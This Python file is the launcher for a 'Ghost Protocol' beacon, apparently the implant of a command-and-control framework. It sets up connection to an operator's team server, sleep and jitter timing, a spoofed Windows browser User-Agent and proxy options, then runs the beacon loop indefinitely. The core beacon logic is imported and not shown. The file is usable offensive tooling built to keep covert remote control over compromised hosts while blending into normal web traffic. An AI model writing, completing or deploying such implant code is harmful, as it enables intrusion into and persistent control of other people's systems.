"""
Ghost Protocol Beacon Entry Point
"""

import sys
import asyncio
import argparse
import logging
from typing import Optional

from .core import BeaconCore
from ..core import Config, setup_logging


def main():
    """Main entry point for the Ghost Protocol beacon"""
    parser = argparse.ArgumentParser(description="Ghost Protocol Beacon")
    parser.add_argument("--server", required=True, help="Team server address (e.g., https://192.168.1.100:443)")
    parser.add_argument("--sleep", type=int, default=60, help="Sleep interval in seconds")
    parser.add_argument("--jitter", type=int, default=10, help="Jitter percentage (0-50)")
    parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", help="HTTP User-Agent")
    parser.add_argument("--config", help="Configuration file path")
    parser.add_argument("--log-level", default="WARNING", help="Log level")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy:8080)")
    parser.add_argument("--cert-check", action="store_true", help="Verify SSL certificates")
    parser.add_argument("--beacon-id", help="Custom beacon ID")
    
    args = parser.parse_args()
    
    # Setup logging
    setup_logging("ghost_protocol.beacon", args.log_level)
    
    # Load configuration
    config = Config(args.config)
    
    # Override config with command line args
    config.beacon = getattr(config, 'beacon', type('obj', (object,), {})())
    config.beacon.server_url = args.server
    config.beacon.sleep_interval = args.sleep
    config.beacon.jitter_percent = args.jitter
    config.beacon.user_agent = args.user_agent
    config.beacon.proxy_url = args.proxy
    config.beacon.verify_ssl = args.cert_check
    config.beacon.beacon_id = args.beacon_id
    
    # Create and run beacon
    async def run_beacon():
        beacon = BeaconCore(config)
        
        try:
            if await beacon.start():
                await beacon.run_forever()
            else:
                print("Failed to start beacon")
                return 1
        except KeyboardInterrupt:
            print("\nBeacon stopped by user")
        except Exception as e:
            print(f"Beacon error: {e}")
            return 1
        finally:
            await beacon.stop()
            
        return 0
    
    try:
        result = asyncio.run(run_beacon())
        sys.exit(result)
    except KeyboardInterrupt:
        print("\nBeacon interrupted")
        sys.exit(0)
    except Exception as e:
        print(f"Fatal beacon error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
